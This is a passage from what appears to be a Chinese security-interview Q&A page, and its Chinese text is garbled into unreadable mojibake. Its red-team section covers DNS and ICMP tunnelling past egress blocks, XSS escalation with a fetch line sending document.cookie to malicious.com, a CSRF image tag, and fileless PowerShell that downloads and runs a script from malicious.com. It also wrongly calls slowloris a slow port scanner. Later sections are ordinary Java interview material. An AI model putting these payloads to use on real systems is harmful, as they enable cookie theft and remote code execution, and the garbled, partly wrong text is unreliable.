<code>Base64</code>ï¼‰</td></tr><tr><td><strong>HIDS</strong></td><td>ä»£ç æ³¨å…¥ï¼Œéšè—è¿›ç¨‹</td></tr><tr><td><strong>å¨èƒæ„ŸçŸ¥</strong></td><td>ä¼ªè£… <code>User-Agent</code>ï¼Œé¿å…æµé‡ç‰¹å¾åŒ¹é…</td></tr></tbody></table><hr><h3 id="å¦‚ä½•åœ¨ç¦æ­¢å‡ºç½‘çš„æœºå™¨ä¸Šè®¿é—®äº’è”ç½‘ï¼Ÿ"><a href="#å¦‚ä½•åœ¨ç¦æ­¢å‡ºç½‘çš„æœºå™¨ä¸Šè®¿é—®äº’è”ç½‘ï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨ç¦æ­¢å‡ºç½‘çš„æœºå™¨ä¸Šè®¿é—®äº’è”ç½‘ï¼Ÿ"></a><strong>å¦‚ä½•åœ¨ç¦æ­¢å‡ºç½‘çš„æœºå™¨ä¸Šè®¿é—®äº’è”ç½‘ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼š</p><ol><li><strong>DNS éš§é“</strong>ï¼š<ul><li>é€šè¿‡ <code>iodine</code> å°†æ•°æ®å°è£…è¿› DNS æŸ¥è¯¢ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P password my.dnstunnel.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ICMP éš§é“</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Ptunnel</code> é€šè¿‡ ICMP ä¼ è¾“ TCP æµé‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8000 -da target.com -dp 80</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>è“ç‰™&#x2F;æ‰‹æœºçƒ­ç‚¹</strong>ï¼š<ul><li>åˆ©ç”¨æ‰‹æœºåˆ›å»ºçƒ­ç‚¹ï¼Œç‰©ç†ç»•è¿‡ç½‘ç»œé™åˆ¶ã€‚</li></ul></li></ol><hr><h3 id="ewã€frp-å·®å¼‚ï¼Ÿ"><a href="#ewã€frp-å·®å¼‚ï¼Ÿ" class="headerlink" title="ewã€frp å·®å¼‚ï¼Ÿ"></a><strong>ewã€frp å·®å¼‚ï¼Ÿ</strong></h3><table><thead><tr><th><strong>å·¥å…·</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>ä¼˜ç‚¹</strong></th><th><strong>ç¼ºç‚¹</strong></th></tr></thead><tbody><tr><td><strong>ew</strong></td><td>åå‘ä»£ç†</td><td>è½»é‡çº§ã€æ— ä¾èµ–</td><td>åŠŸèƒ½è¾ƒå°‘</td></tr><tr><td><strong>frp</strong></td><td>å†…ç½‘ç©¿é€</td><td>æ”¯æŒ TCPã€UDPã€HTTP</td><td>éœ€è¦å…¬ç½‘æœåŠ¡å™¨</td></tr></tbody></table><hr><h3 id="ICMP-å¦‚ä½•å‡ºç½‘ï¼Ÿ"><a href="#ICMP-å¦‚ä½•å‡ºç½‘ï¼Ÿ" class="headerlink" title="ICMP å¦‚ä½•å‡ºç½‘ï¼Ÿ"></a><strong>ICMP å¦‚ä½•å‡ºç½‘ï¼Ÿ</strong></h3><p><strong>ICMP éš§é“æ–¹å¼</strong>ï¼š</p><ol><li>**ä½¿ç”¨ <code>Ptunnel</code>**ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8080 -da google.com -dp 443</span><br></pre></td></tr></table></figure></li><li>**ä½¿ç”¨ <code>icmptx</code>**ï¼š<ul><li>åœ¨å°é” TCP&#x2F;UDP ä½†å…è®¸ ICMP çš„ç¯å¢ƒä¸‹è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•åˆ©ç”¨-XSS-è®©å½±å“æœ€å¤§åŒ–ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨-XSS-è®©å½±å“æœ€å¤§åŒ–ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ XSS è®©å½±å“æœ€å¤§åŒ–ï¼Ÿ"></a><strong>å¦‚ä½•åˆ©ç”¨ XSS è®©å½±å“æœ€å¤§åŒ–ï¼Ÿ</strong></h3><p><strong>æ‰©å¤§ XSS å½±å“çš„æ–¹å¼</strong>ï¼š</p><ol><li><strong>è •è™«åŒ–ä¼ æ’­</strong>ï¼š<ul><li>åˆ©ç”¨ XSS è‡ªåŠ¨æ„ŸæŸ“æ›´å¤šç”¨æˆ·ï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://malicious.com/log?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ç»“åˆ CSRF</strong>ï¼š<ul><li>è®©å—å®³è€…æ‰§è¡Œç®¡ç†å‘˜æ“ä½œï¼š<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://victim.com/delete?user=admin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŠ«æŒ <code>WebSocket</code> è¿æ¥</strong>ï¼š<ul><li>æ§åˆ¶ç”¨æˆ·æµè§ˆå™¨å‘é€æ¶æ„è¯·æ±‚ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•å…¨æµç¨‹æœ€å¤§é™åº¦é™ä½è¢«çº¢å†›å‘ç°æ¦‚ç‡ï¼Ÿ"><a href="#å¦‚ä½•å…¨æµç¨‹æœ€å¤§é™åº¦é™ä½è¢«çº¢å†›å‘ç°æ¦‚ç‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•å…¨æµç¨‹æœ€å¤§é™åº¦é™ä½è¢«çº¢å†›å‘ç°æ¦‚ç‡ï¼Ÿ"></a><strong>å¦‚ä½•å…¨æµç¨‹æœ€å¤§é™åº¦é™ä½è¢«çº¢å†›å‘ç°æ¦‚ç‡ï¼Ÿ</strong></h3><p><strong>é™ä½è¢«å‘ç°çš„æ–¹æ³•</strong>ï¼š</p><ol><li><strong>å‡å°‘ç½‘ç»œå¼‚å¸¸è¡Œä¸º</strong>ï¼š<ul><li>é¿å…é«˜é¢‘ç«¯å£æ‰«æï¼Œä½¿ç”¨ <code>slowloris</code> ä½é€Ÿæ‰«æï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,80,443 -T2 target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ··æ·†æŒ‡çº¹</strong>ï¼š<ul><li>ä¼ªè£… <code>User-Agent</code>ã€<code>TLS Fingerprint</code>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span> https://target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>é¿å…æŒä¹…åŒ–</strong>ï¼š<ul><li>ä½¿ç”¨ <code>fileless</code> æŠ€æœ¯ï¼Œå¦‚ <code>PowerShell</code> ç›´æ¥è¿è¡Œï¼š<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://malicious.com/script.ps1&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>**ä½¿ç”¨ <code>Covert Channel</code>**ï¼š<ul><li>é€šè¿‡ DNSã€ICMP é€šé“å›ä¼ æ•°æ®ï¼Œé¿å…ç›´æ¥æš´éœ² IPã€‚</li></ul></li></ol><hr><h2 id="å®‰å…¨å¼€å‘å²—ä½"><a href="#å®‰å…¨å¼€å‘å²—ä½" class="headerlink" title="å®‰å…¨å¼€å‘å²—ä½"></a>å®‰å…¨å¼€å‘å²—ä½</h2><h3 id="equals-ä¸-çš„åŒºåˆ«"><a href="#equals-ä¸-çš„åŒºåˆ«" class="headerlink" title="equals ä¸ &#x3D;&#x3D; çš„åŒºåˆ«"></a><strong>equals ä¸ &#x3D;&#x3D; çš„åŒºåˆ«</strong></h3><table><thead><tr><th><strong>è¿ç®—ç¬¦&#x2F;æ–¹æ³•</strong></th><th><strong>æ¯”è¾ƒå†…å®¹</strong></th><th><strong>é€‚ç”¨ç±»å‹</strong></th></tr></thead><tbody><tr><td><code>==</code></td><td>æ¯”è¾ƒ <strong>å¼•ç”¨åœ°å€</strong>ï¼ˆåŸºæœ¬æ•°æ®ç±»å‹åˆ™æ¯”è¾ƒå€¼ï¼‰</td><td>åŸºæœ¬ç±»å‹ã€å¯¹è±¡å¼•ç”¨</td></tr><tr><td><code>equals()</code></td><td>æ¯”è¾ƒ <strong>å¯¹è±¡å†…å®¹</strong>ï¼ˆéœ€é‡å†™ <code>equals</code> æ–¹æ³•ï¼‰</td><td>ä»…é€‚ç”¨äºå¯¹è±¡</td></tr></tbody></table><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(a == b);        <span class="comment">// false ï¼ˆä¸åŒå¯¹è±¡ï¼‰</span></span><br><span class="line">System.out.println(a.equals(b));   <span class="comment">// true ï¼ˆå†…å®¹ç›¸åŒï¼‰</span></span><br></pre></td></tr></table></figure><hr><h3 id="Java-è™šæ‹ŸæœºåŒºåŸŸå¦‚ä½•åˆ’åˆ†ï¼Ÿ"><a href="#Java-è™šæ‹ŸæœºåŒºåŸŸå¦‚ä½•åˆ’åˆ†ï¼Ÿ" class="headerlink" title="Java è™šæ‹ŸæœºåŒºåŸŸå¦‚ä½•åˆ’åˆ†ï¼Ÿ"></a><strong>Java è™šæ‹ŸæœºåŒºåŸŸå¦‚ä½•åˆ’åˆ†ï¼Ÿ</strong></h3><p><strong>JVM å†…å­˜ç»“æ„</strong>ï¼š</p><ol><li><strong>å †ï¼ˆHeapï¼‰</strong>ï¼š<ul><li>å­˜å‚¨å¯¹è±¡å®ä¾‹ï¼Œåƒåœ¾å›æ”¶å™¨ç®¡ç†ã€‚</li></ul></li><li><strong>æ–¹æ³•åŒºï¼ˆMetaspaceï¼‰</strong>ï¼š<ul><li>å­˜å‚¨ç±»å…ƒä¿¡æ¯ã€å¸¸é‡æ± ã€‚</li></ul></li><li><strong>è™šæ‹Ÿæœºæ ˆï¼ˆJVM Stackï¼‰</strong>ï¼š<ul><li>çº¿ç¨‹ç§æœ‰ï¼Œå­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•è°ƒç”¨å¸§ã€‚</li></ul></li><li><strong>æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Stackï¼‰</strong>ï¼š<ul><li>è°ƒç”¨ <code>JNI</code> ä»£ç æ—¶ä½¿ç”¨ã€‚</li></ul></li><li><strong>ç¨‹åºè®¡æ•°å™¨ï¼ˆPC Registerï¼‰</strong>ï¼š<ul><li>è®°å½•å½“å‰æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ã€‚</li></ul></li></ol><hr><h3 id="æ–¹æ³•é‡è½½ä¸æ–¹æ³•é‡å†™çš„åŒºåˆ«"><a href="#æ–¹æ³•é‡è½½ä¸æ–¹æ³•é‡å†™çš„åŒºåˆ«" class="headerlink" title="æ–¹æ³•é‡è½½ä¸æ–¹æ³•é‡å†™çš„åŒºåˆ«"></a><strong>æ–¹æ³•é‡è½½ä¸æ–¹æ³•é‡å†™çš„åŒºåˆ«</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>æ–¹æ³•é‡è½½ï¼ˆOverloadingï¼‰</strong></th><th><strong>æ–¹æ³•é‡å†™ï¼ˆOverridingï¼‰</strong></th></tr></thead><tbody><tr><td><strong>å®šä¹‰</strong></td><td>ç›¸åŒæ–¹æ³•åï¼Œä¸åŒå‚æ•°åˆ—è¡¨</td><td>å­ç±»ä¿®æ”¹çˆ¶ç±»æ–¹æ³•å®ç°</td></tr><tr><td><strong>ä½œç”¨</strong></td><td>æä¾›å¤šç§è°ƒç”¨æ–¹å¼</td><td>å®ç°å¤šæ€</td></tr><tr><td><strong>è®¿é—®æƒé™</strong></td><td>æ— éœ€ä¸åŸæ–¹æ³•ä¸€è‡´</td><td>ä¸èƒ½é™ä½çˆ¶ç±»æ–¹æ³•æƒé™</td></tr></tbody></table><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•é‡è½½</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">sum</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•é‡å†™</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Parent&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Child&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="HashMapã€HashTableã€ConcurrentHashMap-çš„åŒºåˆ«"><a href="#HashMapã€HashTableã€ConcurrentHashMap-çš„åŒºåˆ«" class="headerlink" title="HashMapã€HashTableã€ConcurrentHashMap çš„åŒºåˆ«"></a><strong>HashMapã€HashTableã€ConcurrentHashMap çš„åŒºåˆ«</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>HashMap</strong></th><th><strong>HashTable</strong></th><th><strong>ConcurrentHashMap</strong></th></tr></thead><tbody><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>âŒ éçº¿ç¨‹å®‰å…¨</td><td>âœ… çº¿ç¨‹å®‰å…¨ï¼ˆåŒæ­¥æ–¹æ³•ï¼‰</td><td>âœ… çº¿ç¨‹å®‰å…¨ï¼ˆåˆ†æ®µé”ï¼‰</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>é«˜</td><td>ä½</td><td>é«˜</td></tr><tr><td><strong>æ˜¯å¦å…è®¸ <code>null</code></strong></td><td><code>key/value</code> éƒ½å…è®¸</td><td><code>key/value</code> éƒ½ä¸å…è®¸</td><td>ä»… <code>value</code> å…è®¸</td></tr></tbody></table><hr><h3 id="è¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«ï¼Œçº¿ç¨‹é—´é€šä¿¡æœ‰å“ªäº›æ–¹å¼ï¼Ÿ"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«ï¼Œçº¿ç¨‹é—´é€šä¿¡æœ‰å“ªäº›æ–¹å¼ï¼Ÿ" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«ï¼Œçº¿ç¨‹é—´é€šä¿¡æœ‰å“ªäº›æ–¹å¼ï¼Ÿ"></a><strong>è¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«ï¼Œçº¿ç¨‹é—´é€šä¿¡æœ‰å“ªäº›æ–¹å¼ï¼Ÿ</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>è¿›ç¨‹</strong></th><th><strong>çº¿ç¨‹</strong></th></tr></thead><tbody><tr><td><strong>å®šä¹‰</strong></td><td>ç‹¬ç«‹è¿è¡Œçš„ç¨‹åºå®ä¾‹</td><td>è¿›ç¨‹å†…çš„æ‰§è¡Œå•å…ƒ</td></tr><tr><td><strong>å†…å­˜å…±äº«</strong></td><td>âŒ ä¸å…±äº«</td><td>âœ… å…±äº«è¿›ç¨‹å†…å­˜</td></tr><tr><td><strong>åˆ›å»ºå¼€é”€</strong></td><td>é«˜</td><td>ä½</td></tr></tbody></table><p><strong>çº¿ç¨‹é—´é€šä¿¡æ–¹å¼</strong>ï¼š</p><ol><li><strong>å…±äº«å†…å­˜</strong>ï¼ˆ<code>volatile</code>ã€<code>synchronized</code>ï¼‰</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼ˆ<code>BlockingQueue</code>ï¼‰</li><li><strong>ç®¡é“é€šä¿¡</strong>ï¼ˆ<code>PipedInputStream</code>ã€<code>PipedOutputStream</code>ï¼‰</li></ol><hr><h3 id="Java-BIO-NIO-AIO-æ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨å“ªäº›åœºæ™¯ï¼Ÿ"><a href="#Java-BIO-NIO-AIO-æ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨å“ªäº›åœºæ™¯ï¼Ÿ" class="headerlink" title="Java BIO&#x2F;NIO&#x2F;AIO æ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨å“ªäº›åœºæ™¯ï¼Ÿ"></a><strong>Java BIO&#x2F;NIO&#x2F;AIO æ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨å“ªäº›åœºæ™¯ï¼Ÿ</strong></h3><table><thead><tr><th><strong>ç±»å‹</strong></th><th><strong>ç‰¹ç‚¹</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td><strong>BIOï¼ˆåŒæ­¥é˜»å¡ï¼‰</strong></td><td>ä¸€ä¸ªçº¿ç¨‹å¤„ç†ä¸€ä¸ªè¿æ¥</td><td>ä½å¹¶å‘ï¼ˆå¦‚ä¼ ç»Ÿ <code>Socket</code>ï¼‰</td></tr><tr><td><strong>NIOï¼ˆåŒæ­¥éé˜»å¡ï¼‰</strong></td><td>é‡‡ç”¨ <code>Selector</code> ç›‘å¬å¤šè¿æ¥</td><td>é«˜å¹¶å‘ï¼ˆå¦‚ <code>Netty</code>ï¼‰</td></tr><tr><td><strong>AIOï¼ˆå¼‚æ­¥éé˜»å¡ï¼‰</strong></td><td><code>OS</code> å›è°ƒå¤„ç†æ•°æ®</td><td>è¶…é«˜å¹¶å‘ï¼ˆå¦‚ <code>WebSocket</code>ï¼‰</td></tr></tbody></table><hr><h3 id="æŒ‘ä¸€ä¸ªè®¾è®¡æ¨¡å¼ï¼ˆå·¥å‚ã€å•ä¾‹ã€é€‚é…å™¨ã€è§‚å¯Ÿè€…ï¼‰è¿›è¡Œè®²è§£"><a href="#æŒ‘ä¸€ä¸ªè®¾è®¡æ¨¡å¼ï¼ˆå·¥å‚ã€å•ä¾‹ã€é€‚é…å™¨ã€è§‚å¯Ÿè€…ï¼‰è¿›è¡Œè®²è§£" class="headerlink" title="æŒ‘ä¸€ä¸ªè®¾è®¡æ¨¡å¼ï¼ˆå·¥å‚ã€å•ä¾‹ã€é€‚é…å™¨ã€è§‚å¯Ÿè€…ï¼‰è¿›è¡Œè®²è§£"></a><strong>æŒ‘ä¸€ä¸ªè®¾è®¡æ¨¡å¼ï¼ˆå·¥å‚ã€å•ä¾‹ã€é€‚é…å™¨ã€è§‚å¯Ÿè€…ï¼‰è¿›è¡Œè®²è§£</strong></h3><h4 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a><strong>å•ä¾‹æ¨¡å¼</strong></h4><p><strong>ä½œç”¨</strong>ï¼š</p><ul><li>ç¡®ä¿å…¨å±€ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œé¿å…èµ„æºæµªè´¹ã€‚</li></ul><p><strong>å®ç°æ–¹å¼</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>æ•°æ®åº“è¿æ¥æ± </strong></li><li><strong>æ—¥å¿—ç®¡ç†å™¨</strong></li></ul><hr><h3 id="synchronized-å¦‚ä½•ä½¿ç”¨ï¼ŸObject-çš„-waitã€notify-æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#synchronized-å¦‚ä½•ä½¿ç”¨ï¼ŸObject-çš„-waitã€notify-æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="synchronized å¦‚ä½•ä½¿ç”¨ï¼ŸObject çš„ waitã€notify æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a><strong>synchronized å¦‚ä½•ä½¿ç”¨ï¼ŸObject çš„ waitã€notify æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></h3><p><strong>synchronized ä½œç”¨</strong>ï¼š</p><ul><li>çº¿ç¨‹åŒæ­¥ï¼Œé¿å…æ•°æ®ç«äº‰ã€‚</li></ul><p><strong>wait&#x2F;notify ä½œç”¨</strong>ï¼š</p><ul><li><code>wait()</code>ï¼šçº¿ç¨‹è¿›å…¥ <strong>ç­‰å¾…çŠ¶æ€</strong>ï¼Œé‡Šæ”¾é”ã€‚</li><li><code>notify()</code>ï¼šå”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WaitNotifyExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">waitMethod</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Waiting...&quot;</span>);</span><br><span class="line">            lock.wait();  <span class="comment">// çº¿ç¨‹è¿›å…¥ç­‰å¾…</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Notified!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">notifyMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            lock.notify();  <span class="comment">// å”¤é†’ç­‰å¾…çš„çº¿ç¨‹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="sleep-å’Œ-wait-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#sleep-å’Œ-wait-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="sleep() å’Œ wait() æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a><strong>sleep() å’Œ wait() æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>sleep()</strong></th><th><strong>wait()</strong></th></tr></thead><tbody><tr><td><strong>å®šä¹‰</strong></td><td>è®©çº¿ç¨‹æš‚åœæ‰§è¡Œ</td><td>è®©çº¿ç¨‹è¿›å…¥ç­‰å¾…é˜Ÿåˆ—</td></tr><tr><td><strong>æ˜¯å¦é‡Šæ”¾é”</strong></td><td>âŒ ä¸é‡Šæ”¾</td><td>âœ… é‡Šæ”¾</td></tr><tr><td><strong>ä½¿ç”¨èŒƒå›´</strong></td><td>ä»»æ„åœ°æ–¹</td><td>åªèƒ½åœ¨ <code>synchronized</code> ä»£ç å—</td></tr></tbody></table><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread.sleep(<span class="number">1000</span>);  <span class="comment">// çº¿ç¨‹æš‚åœ 1s</span></span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123; lock.wait(); &#125;  <span class="comment">// é‡Šæ”¾é”ï¼Œç­‰å¾… notify</span></span><br></pre></td></tr></table></figure><hr><h3 id="ä»€ä¹ˆæ˜¯å¹‚ç­‰æ€§ï¼Ÿä¸€èˆ¬æœ‰ä»€ä¹ˆæ–¹å¼å®ç°ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å¹‚ç­‰æ€§ï¼Ÿä¸€èˆ¬æœ‰ä»€ä¹ˆæ–¹å¼å®ç°ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å¹‚ç­‰æ€§ï¼Ÿä¸€èˆ¬æœ‰ä»€ä¹ˆæ–¹å¼å®ç°ï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯å¹‚ç­‰æ€§ï¼Ÿä¸€èˆ¬æœ‰ä»€ä¹ˆæ–¹å¼å®ç°ï¼Ÿ</strong></h3><p><strong>å®šä¹‰</strong>ï¼š</p><ul><li><strong>é‡å¤æ‰§è¡Œå¤šæ¬¡ï¼Œä¸å½±å“æœ€ç»ˆç»“æœ</strong>ã€‚</li></ul><p><strong>å®ç°æ–¹å¼</strong>ï¼š</p><ol><li><strong>åŸºäºæ•°æ®åº“å”¯ä¸€çº¦æŸ</strong>ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> orders(id, <span class="keyword">user</span>, amount) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Alice&#x27;</span>, <span class="number">100</span>) <span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> amount<span class="operator">=</span>amount;</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>Token</code> æœºåˆ¶</strong>ï¼š<ul><li>é¿å…é‡å¤æäº¤ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (redis.exists(requestToken)) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">redis.set(requestToken, <span class="string">&quot;1&quot;</span>, <span class="number">5</span>, 